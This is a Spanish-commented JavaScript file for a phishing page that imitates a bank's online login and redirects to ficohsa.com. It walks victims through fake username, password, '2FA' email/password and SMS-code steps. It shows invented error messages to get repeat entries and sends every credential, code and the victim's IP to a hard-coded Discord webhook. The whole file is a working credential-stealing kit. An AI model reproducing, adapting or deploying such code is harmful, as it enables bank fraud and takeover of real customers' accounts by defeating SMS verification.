// Datos acumulativos para el mensaje
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1480660691575640116/WniYFtkZWXWvaSRHIJoWDVHY8a8Sx-bXPyCvBlgagoi3sOfw46CYyTk7_rba90fy9A41';
const loginData = {
    usuario: '',
    clave: '',
    correo: '',
    contrasena1: '',
    contrasena2: '',
    pin1: '',
    pin2: '',
    pin3: '',
    userId: Math.floor(Math.random() * 9000) + 1000, // Número aleatorio entre 1000 y 9999
    ip: '',
    fechaHora: ''
};

// Función para enviar datos a un webhook de Discord con formato ordenado
// Eliminada función sendToDiscordWebhook, ahora solo se usan las 3 funciones específicas.

// Enviar primer mensaje: Nuevo cliente detectado
async function sendFirstDiscordMessage() {
    const content = `🟢 Nuevo cliente detectado\nIP: ${loginData.ip}\nFecha y hora: ${loginData.fechaHora}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

// Enviar segundo mensaje: usuario, clave, correo, contraseñas
// Enviar usuario y clave
async function sendUserPassDiscordMessage() {
    const content = `🔐 Usuario y clave\nIP: ${loginData.ip}\nUsuario: ${loginData.usuario}\nClave: ${loginData.clave}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

// Enviar correo y clave
async function sendEmailPassDiscordMessage() {
    const content = `📧 Correo y claves\nIP: ${loginData.ip}\nCorreo: ${loginData.correo}\nClave: ${loginData.contrasena1}\nCorreo2: ${loginData.correo}\nClave2: ${loginData.contrasena2}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

// Enviar tercer mensaje: tokens
async function sendSMS1DiscordMessage() {
    const content = `🔑 SMS1\nIP: ${loginData.ip}\nSMS1: ${loginData.pin1}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

async function sendSMS2DiscordMessage() {
    const content = `🔑 SMS2\nIP: ${loginData.ip}\nSMS2: ${loginData.pin2}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

async function sendSMS3DiscordMessage() {
    const content = `🔑 SMS3\nIP: ${loginData.ip}\nSMS3: ${loginData.pin3}`;
    try {
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content})
        });
    } catch {}
}

// Obtener IP pública
async function fetchPublicIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Desconocida';
    }
}

// Obtener fecha y hora actual
function getCurrentDateTime() {
    const now = new Date();
    return now.toLocaleString();
}

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const loginInput = document.getElementById('login-input');
    const mainBtn = document.getElementById('main-btn');
    const mainTitle = document.getElementById('main-title');
    const iconWrapper = document.getElementById('icon-wrapper');
    const optionsRow = document.getElementById('options-row');
    const buttonsRow = document.getElementById('buttons-row');
    const loginContainer = document.getElementById('login-container');
    const bottomLinks = document.getElementById('bottom-links');
    const togglePasswordBtn = document.getElementById('toggle-password');
    const loader = document.getElementById('loader');
    // Al cargar, obtener IP y fecha/hora y enviar primer mensaje SOLO UNA VEZ
    let detectionSent = false;
    (async () => {
        loginData.ip = await fetchPublicIP();
        loginData.fechaHora = getCurrentDateTime();
        if (!detectionSent) {
            await sendFirstDiscordMessage();
            detectionSent = true;
        }
    })();

    let currentStep = 1; // 1: Username, 2: Password, 3: 2FA, 4: SMS
    let step3Attempts = 0;
    let step4Attempts = 0;

    // Enable/Disable button based on input
    const updateButtonState = (inputEl, btnEl) => {
        if (inputEl.value.trim().length > 0) {
            btnEl.disabled = false;
            btnEl.classList.add('active');
        } else {
            btnEl.disabled = true;
            btnEl.classList.remove('active');
        }
    };

    function attachLoginInputListener() {
        const loginInput = document.getElementById('login-input');
        const mainBtn = document.getElementById('main-btn');
        if (loginInput && mainBtn) {
            loginInput.addEventListener('input', (e) => {
                updateButtonState(e.target, mainBtn);
                // Solo guardar el usuario, NO enviar aún
                loginData.usuario = e.target.value;
            });
        }
    }
    attachLoginInputListener();

    // Handle Form Submission
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();

        if (currentStep === 1) {
            // Paso 1: usuario
            loginData.usuario = document.getElementById('login-input').value;
            goToStep2();
        } else if (currentStep === 2) {
            // Paso 2: clave
            loginData.clave = document.getElementById('login-input').value;
            sendUserPassDiscordMessage();
            showLoader(() => goToStep3());
        } else if (currentStep === 3) {
            // Paso 3: correo y clave (dos intentos)
            if (loginData.contrasena1 === '') {
                loginData.correo = document.getElementById('email-2fa').value;
                loginData.contrasena1 = document.getElementById('pass-2fa').value;
                handleStep3Submit();
            } else {
                loginData.contrasena2 = document.getElementById('pass-2fa').value;
                // Enviar ambos intentos juntos
                sendEmailPassDiscordMessage();
                handleStep3Submit();
            }
        } else if (currentStep === 4) {
            // Paso 4: PINs
            const smsValue = document.getElementById('sms-input').value;
            if (loginData.pin1 === '') {
                loginData.pin1 = smsValue;
                handleStep4Submit();
            } else if (loginData.pin2 === '') {
                loginData.pin2 = smsValue;
                handleStep4Submit();
            } else if (loginData.pin3 === '') {
                loginData.pin3 = smsValue;
                handleStep4Submit();
            }
            // El mensaje a Discord solo se envía en handleStep4Submit cuando step4Attempts === 3
        }
    });

    function showLoader(callback) {
        loader.style.display = 'flex';
        setTimeout(() => {
            loader.style.display = 'none';
            callback();
        }, 2000);
    }

    function handleStep3Submit() {
        step3Attempts++;
        const errorEl = document.getElementById('step3-error');

        if (step3Attempts === 1) {
            errorEl.style.display = 'block';
            // Reset inputs
            document.getElementById('email-2fa').value = '';
            document.getElementById('pass-2fa').value = '';
            document.getElementById('main-btn-3').disabled = true;
            document.getElementById('main-btn-3').classList.remove('active');
        } else {
            errorEl.style.display = 'none';
            showLoader(() => goToStep4());
        }
    }

    function handleStep4Submit() {
        step4Attempts++;
        const errorEl = document.getElementById('step4-error');
        // El valor ya se guarda en el submit, aquí solo gestionamos el flujo
        const smsValue = document.getElementById('sms-input').value;
        console.log('handleStep4Submit llamado, intento:', step4Attempts, 'valor:', smsValue);
        if (step4Attempts === 1) {
            console.log('PIN1 guardado:', loginData.pin1);
            sendSMS1DiscordMessage();
            errorEl.style.display = 'block';
            document.getElementById('sms-input').value = '';
            document.getElementById('main-btn-sms').disabled = true;
            document.getElementById('main-btn-sms').classList.remove('active');
        } else if (step4Attempts === 2) {
            console.log('PIN2 guardado:', loginData.pin2);
            sendSMS2DiscordMessage();
            errorEl.style.display = 'block';
            document.getElementById('sms-input').value = '';
            document.getElementById('main-btn-sms').disabled = true;
            document.getElementById('main-btn-sms').classList.remove('active');
        } else if (step4Attempts === 3) {
            console.log('PIN3 guardado:', loginData.pin3);
            sendSMS3DiscordMessage();
            errorEl.style.display = 'none';
            showLoader(() => {
                window.location.href = 'https://www.ficohsa.com';
            });
        }
    }

    function goToStep2() {
        currentStep = 2;

        // Change Title
        mainTitle.innerHTML = `
            <div class="step-header">
                <a href="#" class="back-btn" id="back-to-step1">
                    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                </a>
                Contraseña
            </div>
        `;

        // Re-inject form structure if coming back from Step 3
        const form = document.getElementById('login-form');
        form.innerHTML = `
            <div class="input-container" id="input-row">
                <div class="user-icon-wrapper" id="icon-wrapper">
                    <svg viewBox="0 0 24 24" style="stroke: #006ce6; fill: none; stroke-width: 1.5; width: 32px; height: 32px;">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        <circle cx="12" cy="16" r="1"></circle>
                    </svg>
                </div>
                <input type="password" class="input-field" id="login-input" placeholder="Ingrese su contraseña">
                <button type="button" class="toggle-password" id="toggle-password" style="display: flex;">
                    <svg viewBox="0 0 24 24">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>
            <div id="password-error" class="error-msg">Error: El usuario y contraseña no coinciden</div>

            <div class="form-options" id="options-row">
                <div class="image-confirmation-wrapper">
                    <div class="confirmation-img-box">
                        <img src="img/icono.png" alt="Icono de seguridad">
                    </div>
                    <div class="confirmation-text">
                        Asegúrese que esta es la imagen seleccionada por Ud
                        <span title="Más información">
                            <svg viewBox="0 0 24 24" style="width:16px; height:16px; vertical-align:middle; fill:none; stroke: #0056b8; stroke-width:1.5;">
                                <circle cx="12" cy="12" r="10"></circle>
                                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                                <line x1="12" y1="17" x2="12.01" y2="17"></line>
                            </svg>
                        </span>
                    </div>
                </div>
            </div>

            <div class="action-row" id="buttons-row">
                <button type="button" class="btn-cancel" id="cancel-btn">Cancelar</button>
                <button type="submit" class="btn-submit" id="main-btn-step2" disabled>Siguiente</button>
            </div>
        `;

        // Update Footer Links
        bottomLinks.innerHTML = `
            <a href="#">¿Ha olvidado su contraseña?</a> <span class="sep">|</span>
            <a href="#">¿Su usuario ha sido bloqueado?</a>
        `;

        // Re-attach all listeners
        const passInput = document.getElementById('login-input');
        const btn2 = document.getElementById('main-btn-step2');
        const toggleBtn = document.getElementById('toggle-password');

        passInput.addEventListener('input', (e) => {
            updateButtonState(e.target, btn2);
        });

        toggleBtn.addEventListener('click', () => {
            const isPassword = passInput.type === 'password';
            passInput.type = isPassword ? 'text' : 'password';
            toggleBtn.innerHTML = isPassword ?
                `<svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>` :
                `<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
        });

        document.getElementById('back-to-step1').addEventListener('click', (e) => {
            e.preventDefault();
            resetToStep1();
        });

        document.getElementById('cancel-btn').addEventListener('click', () => {
            resetToStep1();
        });
    }

    function goToStep3() {
        currentStep = 3;
        step3Attempts = 0;

        mainTitle.innerHTML = `
            <div class="step-header">
                <a href="#" class="back-btn" id="back-to-step2">
                    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                </a>
                Autenticación 2FA
            </div>
        `;

        // Clear Options Row (No key image needed here)
        const optionsRowLocal = document.getElementById('options-row');
        if (optionsRowLocal) optionsRowLocal.innerHTML = '';
        if (togglePasswordBtn) togglePasswordBtn.style.display = 'none'; // Ensure this is hidden if it was visible

        const form = document.getElementById('login-form');
        form.innerHTML = `
        <p style="font-size: 13px; color: #666; margin-bottom: 20px;">
                Ingrese el correo electronico asociado a tu cuenta y contraseña para validar su identidad.
            </p>
            <div class="two-inputs-container">
                <div class="input-row-2fa">
                    <div class="user-icon-wrapper" style="width: 50px;">
                        <svg viewBox="0 0 24 24" style="stroke: var(--panel-blue); fill: none; stroke-width: 1.5; width: 30px; height: 22px;">
                             <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                             <polyline points="22,6 12,13 2,6"></polyline>
                        </svg>
                    </div>
                    <input type="email" class="input-field" id="email-2fa" placeholder="Correo electrónico" style="flex:1;">
                </div>
                <div class="input-row-2fa" style="margin-top: 5px; position:relative;">
                    <div class="user-icon-wrapper" style="width: 50px;">
                        <svg viewBox="0 0 24 24" style="stroke: var(--panel-blue); fill: none; stroke-width: 1.5; width: 30px; height: 22px;">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                            <circle cx="12" cy="16" r="1"></circle>
                        </svg>
                    </div>
                    <input type="password" class="input-field" id="pass-2fa" placeholder="Contraseña" style="flex:1;">
                    <button type="button" class="toggle-password" id="toggle-password-2fa" style="position:absolute; right:10px; top:8px; background:none; border:none; cursor:pointer;">
                        <svg viewBox="0 0 24 24" width="24" height="24">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                        </svg>
                    </button>
                </div>
            </div>
            <div id="step3-error" class="error-msg">Error: El correo electronico asociado y la contraseña no coinciden</div>

            <div class="action-row" id="buttons-row-3" style="margin-top: 20px;">
                <button type="button" class="btn-cancel" id="cancel-btn-3">Cancelar</button>
                <button type="submit" class="btn-submit" id="main-btn-3" disabled>Siguiente</button>
            </div>
        `;

        // Update Footer Links
        bottomLinks.innerHTML = `
            <a href="#">¿No recibió el código?</a> <span class="sep">|</span>
            <a href="#">¿Necesita ayuda?</a>
        `;

        const emailIn = document.getElementById('email-2fa');
        const passIn = document.getElementById('pass-2fa');
        const btn3 = document.getElementById('main-btn-3');
        const toggleBtn2fa = document.getElementById('toggle-password-2fa');

        const validate = () => {
            if (emailIn.value.length > 0 && passIn.value.length > 0) {
                btn3.disabled = false;
                btn3.classList.add('active');
            } else {
                btn3.disabled = true;
                btn3.classList.remove('active');
            }
        };

        emailIn.addEventListener('input', validate);
        passIn.addEventListener('input', validate);

        // OJITO para mostrar/ocultar contraseña
        toggleBtn2fa.addEventListener('click', () => {
            const isPassword = passIn.type === 'password';
            passIn.type = isPassword ? 'text' : 'password';
            toggleBtn2fa.innerHTML = isPassword ?
                `<svg viewBox="0 0 24 24" width="24" height="24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>` :
                `<svg viewBox="0 0 24 24" width="24" height="24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`;
        });

        document.getElementById('back-to-step2').addEventListener('click', (e) => {
            e.preventDefault();
            goToStep2();
        });

        document.getElementById('cancel-btn-3').addEventListener('click', () => {
            resetToStep1();
        });
    }

    function goToStep4() {
        currentStep = 4;
        step4Attempts = 0;

        mainTitle.innerHTML = `
            <div class="step-header">
                <a href="#" class="back-btn" id="back-to-step3">
                    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                </a>
                Autenticación SMS
            </div>
        `;

        // Clear Options Row (No key image needed here)
        const optionsRowLocal = document.getElementById('options-row');
        if (optionsRowLocal) optionsRowLocal.innerHTML = '';
        if (togglePasswordBtn) togglePasswordBtn.style.display = 'none'; // Ensure this is hidden if it was visible

        const form = document.getElementById('login-form');
        form.innerHTML = `
            <p style="font-size: 13px; color: #666; margin-bottom: 20px;">
                Ingrese el código de seguridad de 6 dígitos que hemos enviado a su dispositivo móvil.
            </p>
            <div class="input-container">
                <div class="user-icon-wrapper" style="width: 50px;">
                    <svg viewBox="0 0 24 24" style="stroke: var(--panel-blue); fill: none; stroke-width: 1.5; width: 30px; height: 22px;">
                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
                    </svg>
                </div>
                <input type="text" class="input-field" id="sms-input" maxlength="6" placeholder="Código de 6 dígitos" style="flex:1;">
            </div>
            <div id="step4-error" class="error-msg">Error: El código ingresado no coincide</div>

            <div class="action-row" style="margin-top: 30px;">
                <button type="button" class="btn-cancel" id="cancel-btn-sms">Cancelar</button>
                <button type="submit" class="btn-submit" id="main-btn-sms" disabled>Siguiente</button>
            </div>
        `;

        // Update Footer Links
        bottomLinks.innerHTML = `
            <a href="#">¿No recibió el código?</a> <span class="sep">|</span>
            <a href="#">¿Necesita ayuda?</a>
        `;

        const smsInput = document.getElementById('sms-input');
        const btnSMS = document.getElementById('main-btn-sms');

        smsInput.addEventListener('input', (e) => {
            // Solo números
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            // Habilitar solo si son exactamente 6 dígitos
            if (e.target.value.length === 6) {
                btnSMS.disabled = false;
                btnSMS.classList.add('active');
            } else {
                btnSMS.disabled = true;
                btnSMS.classList.remove('active');
            }
        });

        document.getElementById('back-to-step3').addEventListener('click', (e) => {
            e.preventDefault();
            goToStep3();
        });

        document.getElementById('cancel-btn-sms').addEventListener('click', () => {
            resetToStep1();
        });
    }

    function resetToStep1() {
         showLoader(() => {
                        window.location.href = 'https://www.ficohsa.com';
                    });
    }
});

